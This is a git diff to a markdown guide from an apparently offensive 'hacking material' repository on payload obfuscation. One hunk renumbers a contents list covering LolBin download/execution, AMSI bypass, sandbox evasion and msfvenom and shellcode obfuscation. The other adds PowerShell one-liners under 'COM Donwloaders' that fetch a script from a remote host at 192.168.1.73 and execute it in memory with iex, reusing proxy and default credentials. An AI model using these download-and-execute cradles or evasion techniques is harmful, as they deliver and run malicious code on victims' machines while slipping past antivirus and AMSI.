@@ -63,15 +63,13 @@
 [3] [Powershell Obfuscation Technics (psh-ps1)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#powershell-obfuscation-psh-ps1)<br />
 [4] [VBScript Obfuscation Technics (vba-vbs)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#vbscript-obfuscation-technics-vba-vbs)<br />
 [5] [C Obfuscation Technics (c-exe)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-obfuscation-technics-c-exe)<br />
-
-[?] [Download/Execution (LolBin)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-obfuscation-technics-c-exe)<br />
-
-[6] [AMSI Bypass Technics (COM/REG)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#amsi-comreg-bypass)<br />
-[7] [Bypass the scan engine (sandbox)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-sandbox)<br />
-[8] [Obfuscating msfvenom template (psh-cmd)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#obfuscating-the-metasploit-template-psh-cmd)<br />
-[9] [C to ANCII Obfuscated shellcode (c-ancii)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation-c-ancii)<br />
-[10] [FInal Notes - Remarks - POC's](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes---remarks)<br />
-[11] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks)<br />
+[6] [Download/Execution (LolBin)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#downloadexecution-lolbin)<br />
+[7] [AMSI Bypass Technics (COM/REG)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#amsi-comreg-bypass)<br />
+[8] [Bypass the scan engine (sandbox)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#bypass-the-scan-engine-sandbox)<br />
+[9] [Obfuscating msfvenom template (psh-cmd)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#obfuscating-the-metasploit-template-psh-cmd)<br />
+[10] [C to ANCII Obfuscated shellcode (c-ancii)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#c-to-ancii-obfuscation-c-ancii)<br />
+[11] [FInal Notes - Remarks - POC's](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#final-notes---remarks)<br />
+[12] [Special Thanks - Referencies](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#special-thanks)<br />
 
 
 <br /><br /><br /><br /><br />
@@ -2152,7 +2150,10 @@ COM Donwloaders<br />
 
       $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();$h.responseText > $env:tmp\hello.ps1
 
-      $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
+      $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
+
+      [System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+
 
 BitsAdmin Downloaders<br />
 
